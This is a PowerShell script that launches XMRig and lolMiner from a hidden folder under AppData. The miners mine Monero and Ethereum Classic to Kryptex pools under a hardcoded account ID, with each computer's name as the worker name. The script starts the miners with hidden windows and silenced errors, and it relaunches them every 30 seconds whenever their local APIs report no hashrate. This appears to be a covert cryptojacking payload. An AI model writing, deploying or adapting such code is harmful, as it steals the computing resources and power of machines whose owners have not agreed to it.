$BASE = "$env:APPDATA\.mining"
$BIN_CPU = "$BASE\bin\cpu\xmrig.exe"
$BIN_GPU = "$BASE\bin\gpu\lolMiner.exe"

$KRIPTEX="krxX3PVQVR"
$XMR_POOL="xmr.kryptex.network:7029"
$ETC_POOL="etc.kryptex.network:7033"
$HOST=$env:COMPUTERNAME

function CPU-Alive {
  try {
    $c=Invoke-RestMethod "http://127.0.0.1:16000/1/summary"
    return ([int]$c.hashrate.total[0] -gt 0)
  } catch { return $false }
}

function GPU-Alive {
  try {
    $g=Invoke-RestMethod "http://127.0.0.1:8080/summary"
    return ([int]($g.Session.Performance_Summary.Performance*1e6) -gt 0)
  } catch { return $false }
}

while ($true) {
  if (-not (CPU-Alive)) {
    Start-Process $BIN_CPU `
      "-o $XMR_POOL -u $KRIPTEX.$HOST -p x --http-enabled --http-port 16000" `
      -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
  }
  if (-not (GPU-Alive)) {
    Start-Process $BIN_GPU `
      "--algo ETCHASH --pool $ETC_POOL --user $KRIPTEX.$HOST --apiport 8080" `
      -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
  }
  Start-Sleep 30
}
